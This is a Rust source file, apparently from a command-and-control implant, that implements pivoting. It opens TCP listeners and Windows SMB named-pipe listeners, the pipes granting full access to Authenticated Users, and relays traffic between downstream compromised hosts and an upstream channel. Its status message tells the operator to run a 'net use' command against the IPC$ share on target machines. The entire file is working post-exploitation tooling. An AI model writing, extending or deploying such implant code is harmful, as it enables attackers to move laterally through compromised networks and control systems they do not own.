// src/agent/pivot.rs
use tokio::net::TcpListener;
use tokio::sync::mpsc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use crate::common::PivotFrame;
use serde_json;

#[cfg(target_os = "windows")]
use tokio::net::windows::named_pipe::NamedPipeServer;

#[cfg(target_os = "windows")]
use std::ffi::CString;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use std::ffi::c_void;

pub type StreamMap = Arc<Mutex<HashMap<u32, mpsc::UnboundedSender<Vec<u8>>>>>;

pub struct PivotManager {
    pub local_streams: StreamMap,
    pub downstream_links: StreamMap, 
    upstream_tx: mpsc::Sender<Vec<u8>>,
}

impl PivotManager {
    pub fn new(upstream_tx: mpsc::Sender<Vec<u8>>) -> Self {
        Self {
            local_streams: Arc::new(Mutex::new(HashMap::new())),
            downstream_links: Arc::new(Mutex::new(HashMap::new())),
            upstream_tx,
        }
    }

    pub async fn start_agent_listener(&self, port: u16) -> String {
        let listener = match TcpListener::bind(format!("0.0.0.0:{}", port)).await {
            Ok(l) => l,
            Err(e) => return format!("Bind Error: {}", e),
        };

        let downstream_links = self.downstream_links.clone();
        let upstream_tx = self.upstream_tx.clone();

        tokio::spawn(async move {
            let mut link_id_counter = 5000; 

            loop {
                if let Ok((stream, addr)) = listener.accept().await {
                    let link_id = link_id_counter;
                    link_id_counter += 1;
                    
                    let (tx, mut rx) = mpsc::unbounded_channel::<Vec<u8>>();
                    downstream_links.lock().unwrap().insert(link_id, tx);

                    let upstream_inner = upstream_tx.clone();
                    let links_inner = downstream_links.clone();

                    let init_frame = PivotFrame {
                        stream_id: link_id,
                        destination: 0,
                        source: link_id,
                        data: vec![],
                        metadata: addr.to_string(), 
                    };
                    if let Ok(serialized) = serde_json::to_vec(&init_frame) {
                        let _ = upstream_inner.send(serialized).await;
                    }

                    tokio::spawn(async move {
                        let (mut reader, mut writer) = tokio::io::split(stream);
                        let mut buf = [0u8; 8192];

                        loop {
                            tokio::select! {
                                n = reader.read(&mut buf) => {
                                    match n {
                                        Ok(n) if n > 0 => {
                                            let frame = PivotFrame {
                                                stream_id: link_id,
                                                destination: 0, 
                                                source: link_id, 
                                                data: buf[..n].to_vec(),
                                                metadata: String::new(), 
                                            };
                                            if let Ok(serialized) = serde_json::to_vec(&frame) {
                                                let _ = upstream_inner.send(serialized).await;
                                            }
                                        },
                                        _ => break,
                                    }
                                },
                                Some(data) = rx.recv() => {
                                    if writer.write_all(&data).await.is_err() { break; }
                                    let _ = writer.flush().await;
                                }
                            }
                        }
                        links_inner.lock().unwrap().remove(&link_id);
                    });
                }
            }
        });

        format!("TCP Pivot Listener started on port {}", port)
    }

    #[cfg(target_os = "windows")]
    pub async fn start_named_pipe_listener(&self, pipe_name: String) -> String {
        let full_path = format!(r"\\.\pipe\{}", pipe_name);
        let downstream_links = self.downstream_links.clone();
        let upstream_tx = self.upstream_tx.clone();

        let path_clone = full_path.clone();

        tokio::spawn(async move {
            let mut link_id_counter = 8000; 

            loop {
                // Creates pipe with: Authenticated Users (AU) permission.
                let server = match create_security_pipe(&path_clone) {
                    Ok(s) => s,
                    Err(e) => {
                        eprintln!("[Pivot] Pipe Create Error: {}", e);
                        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                        continue;
                    }
                };

                if let Ok(_) = server.connect().await {
                    let link_id = link_id_counter;
                    link_id_counter += 1;

                    let (tx, mut rx) = mpsc::unbounded_channel::<Vec<u8>>();
                    downstream_links.lock().unwrap().insert(link_id, tx);

                    let upstream_inner = upstream_tx.clone();
                    let links_inner = downstream_links.clone();

                    let init_frame = PivotFrame {
                        stream_id: link_id,
                        destination: 0,
                        source: link_id,
                        data: vec![],
                        metadata: format!("SMB:{}", pipe_name), 
                    };
                    if let Ok(serialized) = serde_json::to_vec(&init_frame) {
                        let _ = upstream_inner.send(serialized).await;
                    }

                    tokio::spawn(async move {
                        let (mut reader, mut writer) = tokio::io::split(server);
                        let mut buf = [0u8; 8192];

                        loop {
                            tokio::select! {
                                n = reader.read(&mut buf) => {
                                    match n {
                                        Ok(n) if n > 0 => {
                                            let frame = PivotFrame {
                                                stream_id: link_id,
                                                destination: 0,
                                                source: link_id,
                                                data: buf[..n].to_vec(),
                                                metadata: String::new(),
                                            };
                                            if let Ok(serialized) = serde_json::to_vec(&frame) {
                                                let _ = upstream_inner.send(serialized).await;
                                            }
                                        },
                                        _ => break,
                                    }
                                },
                                Some(data) = rx.recv() => {
                                    if writer.write_all(&data).await.is_err() { break; }
                                }
                            }
                        }
                        links_inner.lock().unwrap().remove(&link_id);
                    });
                }
            }
        });

        // [MODIFIED] Added Hint to the return string
        format!(
            "SMB Named Pipe Listener started at {} (Authenticated Users Only).\n\n[!] REQUIRED: Destination hosts must have an authenticated session to this machine.\n    Run on Target: net use \\\\<PIVOT_IP>\\IPC$ /user:<USERNAME> <PASSWORD>",
            full_path
        )
    }

    #[cfg(not(target_os = "windows"))]
    pub async fn start_named_pipe_listener(&self, _pipe_name: String) -> String {
        "Error: Named Pipes are Windows-only.".to_string()
    }

    pub fn handle_downstream_frame(&self, frame: PivotFrame) {
        let links = self.downstream_links.lock().unwrap();
        if let Some(tx) = links.get(&frame.destination) {
            let _ = tx.send(frame.data);
        }
    }
}

// --- WINDOWS FFI FOR AUTHENTICATED PIPE CREATION ---

#[cfg(target_os = "windows")]
fn create_security_pipe(path: &str) -> std::io::Result<NamedPipeServer> {
    unsafe {
        // SDDL: D:(A;;GA;;;AU) -> Allow GenericAll to Authenticated Users
        let sddl = CString::new("D:(A;;GA;;;AU)").unwrap();
        
        let mut sa: SECURITY_ATTRIBUTES = std::mem::zeroed();
        sa.nLength = std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32;
        sa.bInheritHandle = 0;

        if ConvertStringSecurityDescriptorToSecurityDescriptorA(
            sddl.as_ptr(),
            1, // SDDL_REVISION_1
            &mut sa.lpSecurityDescriptor,
            ptr::null_mut(),
        ) == 0 {
            return Err(std::io::Error::last_os_error());
        }

        let path_c = CString::new(path).unwrap();
        
        let open_mode = 0x00000003 | 0x40000000; // DUPLEX | OVERLAPPED
        let pipe_mode = 0x00000000; // BYTE | READMODE_BYTE | WAIT

        let handle = CreateNamedPipeA(
            path_c.as_ptr(),
            open_mode, 
            pipe_mode, 
            255, 
            8192, 
            8192, 
            0, 
            &mut sa, 
        );

        LocalFree(sa.lpSecurityDescriptor);

        if handle == ( -1isize as *mut c_void ) { // INVALID_HANDLE_VALUE
            return Err(std::io::Error::last_os_error());
        }

        NamedPipeServer::from_raw_handle(handle)
    }
}

// --- FFI DEFINITIONS ---
#[cfg(target_os = "windows")]
#[repr(C)]
#[allow(non_snake_case)] 
struct SECURITY_ATTRIBUTES {
    nLength: u32,
    lpSecurityDescriptor: *mut c_void,
    bInheritHandle: i32,
}

#[cfg(target_os = "windows")]
#[link(name = "kernel32")]
extern "system" {
    fn CreateNamedPipeA(
        lpName: *const i8,
        dwOpenMode: u32,
        dwPipeMode: u32,
        nMaxInstances: u32,
        nOutBufferSize: u32,
        nInBufferSize: u32,
        nDefaultTimeOut: u32,
        lpSecurityAttributes: *mut SECURITY_ATTRIBUTES,
    ) -> *mut c_void;

    fn LocalFree(hMem: *mut c_void) -> *mut c_void;
}

#[cfg(target_os = "windows")]
#[link(name = "advapi32")]
extern "system" {
    fn ConvertStringSecurityDescriptorToSecurityDescriptorA(
        StringSecurityDescriptor: *const i8,
        StringSDRevision: u32,
        SecurityDescriptor: *mut *mut c_void,
        SecurityDescriptorSize: *mut u32,
    ) -> i32;
}
